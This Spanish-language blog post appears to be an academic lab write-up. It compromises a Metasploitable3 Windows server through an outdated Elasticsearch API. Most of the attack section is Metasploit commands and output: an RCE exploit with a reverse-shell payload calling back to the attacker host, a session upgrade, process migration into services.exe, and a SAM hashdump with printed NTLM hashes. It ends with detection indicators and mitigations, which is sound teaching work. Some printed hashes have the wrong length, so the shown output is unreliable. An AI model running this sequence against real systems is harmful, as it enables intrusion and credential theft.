---
layout: post
title: Elasticsearch Remote Code Execution & Post-Exploitation with Metasploit
date: 2026-06-11 19:00:00 +0200
categories: [Cybersecurity, Penetration Testing]
tags: [academic, writeup, nmap, metasploit, elasticsearch, windows-server]
---

# ⚔️ Elasticsearch Remote Code Execution & Post-Exploitation with Metasploit

| Campo | Descripción |
| :--- | :--- |
| **Tecnologías / Herramientas** | Nmap, Metasploit Framework, Meterpreter, Elasticsearch, Windows Server 2008 R2 |
| **Tags / Keywords** | #Metasploit #Meterpreter #Elasticsearch #RCE #PostExploitation #BlueTeam #WindowsServer |
| **Categorías** | Penetration Testing / Análisis de Malware |
| **Autor** | Kevin López Granado |

---

## ⚔️ Elasticsearch Remote Code Execution & Post-Exploitation with Metasploit

### 🎯 Objetivo

El objetivo de esta actividad práctica es reproducir un ciclo completo de intrusión y post-explotación sobre un entorno corporativo virtualizado, analizando las deficiencias de seguridad en el despliegue de servicios y el comportamiento de los agentes de control remoto.

El laboratorio se centra en auditar un servidor objetivo mediante técnicas de *fingerprinting*, explotar una vulnerabilidad de ejecución remota de código (**RCE**) en una instancia obsoleta de **Elasticsearch**, migrar entre distintas arquitecturas de payloads e interactuar de forma avanzada con el sistema operativo para la extracción de credenciales de la base de datos **SAM**. Desde la perspectiva del Blue Team, este análisis permite identificar las huellas y evidencias que deja un atacante en memoria y comprender la criticidad de romper el principio de menor privilegio.

* **Máquina atacante:** Kali Linux (Rango IP de red local: `192.168.56.0/24`)
* **Máquina objetivo:** Metasploitable3 (`192.168.56.103`)

---

### 🛠️ Prerrequisitos

Para replicar este escenario de auditoría, se requiere:
* Una instancia de **Kali Linux** con las herramientas Nmap y Metasploit instaladas.
* Una máquina objetivo (**Metasploitable3** o entorno Windows Server vulnerable).
* Conectividad a nivel de capa 3 en un segmento de red local aislado.
* Conocimientos de la arquitectura del Framework Metasploit, manipulación de payloads (*Bind* vs. *Reverse*), llamadas a la API de Windows y persistencia de agentes.

---

### 🚀 Ejecución y Fases del Laboratorio

#### 1. Fase de Reconocimiento y Fingerprinting

El objetivo inicial es confirmar la presencia de la máquina objetivo dentro del segmento asignado y realizar un análisis detallado de su superficie de ataque.

##### 1.1. Descubrimiento de Hosts Activos en la Red
Se lanza un escaneo inicial de descubrimiento utilizando **Nmap** sobre el rango local:
```bash
nmap 192.168.56.0/24
```

_Resultados del escaneo:_
Se descarta la dirección IP `192.168.56.100` al mostrar todos sus puertos cerrados. Se identifica formalmente como host víctima la dirección **`192.168.56.103`**, la cual se encuentra activa y expone múltiples puertos TCP preliminares abiertos.

![Descubrimiento de hosts con Nmap](/assets/img/posts/metasploit/metasploit-1.png)*Figura 1: Descubrimiento de hosts con Nmap*

##### 1.2. Escaneo Avanzado y Detección de Versiones
Una vez localizado el objetivo, se ejecuta un escaneo agresivo enfocado utilizando los parámetros `-sS` (TCP SYN Scan) y `-sV` (Detección de versiones de servicios) para perfilar los vectores potenciales de compromiso:
```bash
nmap -sS -sV 192.168.56.103
```

_Filtro de servicios destacados en la telemetría:_
```text
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     Microsoft ftpd
22/tcp   open  ssh     OpenSSH 7.1 (protocol 2.0)
80/tcp   open  http    Microsoft IIS httpd 7.5
4848/tcp open  http    Oracle GlassFish 4.0
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0
8080/tcp open  http    Oracle GlassFish 4.0
8383/tcp open  http    Apache httpd
9200/tcp open  http    Elasticsearch REST API 1.1.1 (Lucene 4.7)
```

![Descubrimiento de puertos con Nmap](/assets/img/posts/metasploit/metasploit-2.png)*Figura 2: Descubrimiento de puertos con Nmap*
![Descubrimiento de puertos y versiones con Nmap (I)](/assets/img/posts/metasploit/metasploit-3.png)*Figura 3: Descubrimiento de puertos y versiones con Nmap (I)*
![Descubrimiento de puertos y versiones con Nmap (II)](/assets/img/posts/metasploit/metasploit-4.png)*Figura 4: Descubrimiento de puertos y versiones con Nmap (II)*

> **Deducción de Infraestructura:** El análisis del sistema operativo confirma un entorno corporativo basado en **Windows Server 2008 R2** (deducido por la huella de la versión nativa de IIS 7.5). El principal vector de compromiso crítico se localiza en el puerto **`9200/tcp`**, el cual expone una versión obsoleta y vulnerable de **Elasticsearch REST API 1.1.1**, convirtiéndose en el objetivo prioritario para la intrusión.

---

### 💡 Estudio Teórico de Payloads: Bind TCP vs. Reverse TCP

La diferencia fundamental entre ambos tipos de payloads radica en cuál de las dos máquinas inicia la sesión de red para establecer el canal de control remoto.

* **Payload de tipo Bind (Bind TCP):** Abre un puerto de escucha predeterminado en la máquina víctima (actúa como servidor). El atacante debe conectarse activamente a la IP del objetivo para tomar el control. 
  * *Inconveniente defensivo:* Los cortafuegos perimetrales bloquean de forma estricta todo el tráfico entrante no solicitado hacia la organización, por lo que este ataque suele fallar en entornos de producción reales.
* **Payload de tipo Reverse (Reverse TCP):** El atacante configura su máquina Kali a la escucha (*Multi-Handler*) y el payload inyectado fuerza una conexión saliente desde la máquina víctima hacia la IP pública o privada del auditor.
  * *Ventaja defensiva:* Es el estándar en auditorías de seguridad. Evade eficientemente las reglas de Firewalls perimetrales debido a que las políticas corporativas suelen permitir conexiones salientes comunes (como la navegación web o puertos HTTP/HTTPS) y permite saltar barreras NAT.

---

#### 2. Fase de Explotación y Obtención del Control Remoto

##### 2.1. Selección del Módulo de Explotación
Basándose en el fingerprinting que reveló la versión vulnerable de Elasticsearch (`1.1.1`), se recurre a la base de datos de **Metasploit Framework** para cargar el vector adecuado. Se selecciona el exploit de ejecución remota de código (RCE) asociado a la vulnerabilidad de scripts dinámicos MVEL:

```bash
msfconsole
msf6 > use exploit/multi/elasticsearch/script_mvel_rce
```

![Identificación modulo y explotación vulnerabilidad Elasticsearch](/assets/img/posts/metasploit/metasploit-5.png)*Figura 5: Identificación modulo y explotación vulnerabilidad Elasticsearch*

De forma automatizada, el framework asigna el payload multiplataforma por defecto: `java/meterpreter/reverse_tcp`.

##### 2.2. Configuración de Parámetros
Antes de lanzar el ataque, se definen e inspeccionan las variables necesarias mediante el comando `show options` para garantizar el retorno estable de la sesión de Meterpreter:
```bash
msf6 exploit(...) > set RHOSTS 192.168.56.103
msf6 exploit(...) > set RPORT 9200
msf6 exploit(...) > set LHOST 192.168.56.101
msf6 exploit(...) > set LPORT 4444
```

![Configuración entorno](/assets/img/posts/metasploit/metasploit-6.png)*Figura 6: Configuración entorno*

##### 2.3. Ejecución del Exploit
Se ejecuta la explotación activa contra el servidor objetivo:
```bash
msf6 exploit(...) > exploit
```

![Ejecución explotación activa](/assets/img/posts/metasploit/metasploit-7.png)*Figura 7: Ejecución explotación activa*

##### 2.4. Verificación del Control Remoto Efectivo
Para certificar el compromiso de la infraestructura, se interactúa con el prompt inicial de Meterpreter ejecutando comandos de auditoría interna:
```text
meterpreter > sysinfo
Computer            : metasploitable3-win2k8
OS                  : Windows Server 2008 R2 6.1 (amd64)
Architecture        : x64
System Language     : en_US
Meterpreter         : java/windows

meterpreter > getuid
Server username: METASPLOITABLE3$

meterpreter > pwd
C:\Program Files\elasticsearch-1.1.1
```

![Verificación del control remoto](/assets/img/posts/metasploit/metasploit-8.png)*Figura 8: Verificación del control remoto*

---

#### 3. Fase de Posexplotación y Consolidación del Acceso

##### 3.1. Análisis del Contexto de Integridad Alto Heredado
Al iniciar las acciones de auditoría, se constató que la sesión de Meterpreter operaba directamente bajo el contexto de máximos privilegios de la máquina: **`NT AUTHORITY\SYSTEM`**.

> **Fallo de Hardening Detectado:** Esto se debe a una deficiencia severa en el despliegue del servidor. El servicio de Elasticsearch (asociado al proceso `java.exe`) fue instalado e iniciado utilizando los privilegios de la cuenta de Administrador del Sistema en lugar de emplear una cuenta de servicio dedicada, aislada y con permisos restringidos. Al recibir el exploit RCE, el payload inyectado heredó automáticamente el token de acceso y el nivel de integridad alto del proceso padre, rompiendo por completo el **Principio de Menor Privilegio**.

##### 3.2. Restricciones del Entorno y Actualización de Sesión
Durante las acciones posteriores con el payload multiplataforma de Java, el comando nativo `migrate` fue rechazado por el sistema:
```text
meterpreter > migrate 5304
The "migrate" command is not supported by this Meterpreter type (java/windows)
```
La Máquina Virtual de Java (JVM) opera en un entorno virtualizado que carece de las extensiones de la API de Windows necesarias para interactuar de forma directa con la memoria del kernel.

![Rechazo explotación](/assets/img/posts/metasploit/metasploit-9.png)*Figura 9: Rechazo explotación*

Para solucionar esta restricción técnica, se listaron las conexiones en segundo plano y se realizó un **upgrade** de la sesión hacia un Meterpreter nativo de Windows x64:
```bash
msf6 > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session 1
[*] Content uploaded and meterpreter native session 2 (x64/windows) opened!
```

![Actualizamos de sesión limitada (Java) a un meterpreter de Windows](/assets/img/posts/metasploit/metasploit-10.png)*Figura 10: Actualizamos de sesión limitada (Java) a un meterpreter de Windows*

##### 3.3. Migración de Proceso y Extracción de Credenciales (Hashdump)
Con la nueva sesión interactiva nativa de Windows (`x64/windows`), las limitaciones desaparecieron y se procedió a ejecutar la secuencia técnica de consolidación de forma exitosa:

1. **Migración del Proceso:** Se transfirió la ejecución del agente desde el hilo inicial inestable hacia el PID `472`, perteneciente al servicio crítico del sistema **`services.exe`**. Esto garantiza una alta estabilidad frente a posibles reinicios de servicios web o cierres de procesos de usuario.
2. **Elevación y Confirmación:** El comando `getuid` corroboró formalmente la retención de la identidad máxima de sistema.
3. **Hashdump (Extracción SAM):** Al contar con el nivel de integridad requerido, se interactuó con el proceso de seguridad local para volcar la base de datos SAM, obteniendo los usuarios del entorno (incluyendo `Administrator`, `vagrant` y cuentas locales del laboratorio) junto con sus respectivos hashes NTLM listos para auditorías de contraseñas.

```text
meterpreter > migrate 472
[*] Migrating from 5640 to 472...
[*] Migration completed successfully.

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e82bc503339d51f71d913c245d35b50b:::
anakin_skywalker:1011:aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de9afa:::
artoo_detoo:1007:aad3b435b51404eeaad3b435b51404ee:facbaada8b7afc418b3afea63b757764:::
ben_kenobi:1009:aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859:::
boba_fett:1014:aad3b435b51404eeaad3b435b51404ee:d6ef9a4859da4feadaf160e97d200dc9:::
chewbacca:1017:aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8:::
c_three_pio:1008:aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa590171ba066c037397ee1:::
darth_vader:1010:aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aeae1ed:::
greedo:1016:aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522644686649082db:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c8:::
han_solo:1006:aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951:::
jabba_hutt:1015:aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76:::
jarjar_binks:1012:aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1938b0917c4d4:::
kylo_ren:1018:aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331094ae18b00111:::
lando_calrissian:1013:aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f:::
leia_organa:1004:aad3b435b51404eeaad3b435b51404ee:8ae6a610ce203621cf9cfa6f21f14020:::
luke_skywalker:1005:aad3b435b51404eeaad3b435b51404ee:4b1e6150bde6998ed22b0e9bac62005a:::
sshd:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sshd_server:1002:aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e82bc503339d51f71d913c245d35b50b:::
```

![ Migración, escalada y obtención de credenciales](/assets/img/posts/metasploit/metasploit-11.png)*Figura 11:  Migración, escalada y obtención de credenciales*

---

### 📝 Resumen Defensivo

El laboratorio evidencia cómo vulnerabilidades de ejecución remota de código (RCE) en plataformas desactualizadas exponen drásticamente los datos centrales de la organización. A nivel de respuesta ante incidentes y análisis forense, los movimientos del atacante (la actualización del payload y la inyección en procesos críticos del kernel) son detectables en las auditorías de memoria interna.

> **Indicadores de Compromiso de Posexplotación (IoCs):** Los equipos SOC e ingenieros de detección deben monitorizar:
> * Procesos nativos de alta integridad (como `services.exe` o `lsass.exe`) recibiendo hilos de ejecución (*hashing/injection*) o conexiones directas procedentes de procesos anómalos o de red.
> * Ejecución de llamadas de sistema inusuales o volcados de memoria asociados a los registros del Administrador de Cuentas de Seguridad (SAM).
> * Conexiones de red salientes no justificadas desde aplicaciones internas de bases de datos hacia puertos atípicos.

---

### 💡 Conclusiones y Recomendaciones de Mitigación

* **Aislamiento y Principio de Menor Privilegio:** Es crítico subsanar los despliegues deficientes de aplicaciones perimetrales. Ningún motor web o API REST (como Elasticsearch o servidores Java) debe ejecutarse bajo la cuenta de administración máxima `SYSTEM`. Deben operar en cuentas de servicio locales aisladas sin privilegios interactivos ni permisos de escritura sobre recursos críticos.
* **Política estricta de Parcheado (Patch Management):** Mantener aplicaciones desactualizadas en entornos de red corporativa anula cualquier medida defensiva. Es imperativo desbancar y auditar de forma recurrente las versiones legacy con fallos públicos explotables de RCE conocidos.
* **Control perimetral y detección basada en Endpoint (EDR):** Implementar soluciones de protección Endpoint capaces de interceptar la inyección de código lícito en procesos del sistema operativo (`process migration`) y bloquear el acceso ilegítimo a la base de datos SAM. Esto debe ser complementado con reglas de firewall locales de salida para evitar el retorno exitoso de conexiones inversas de Meterpreter.
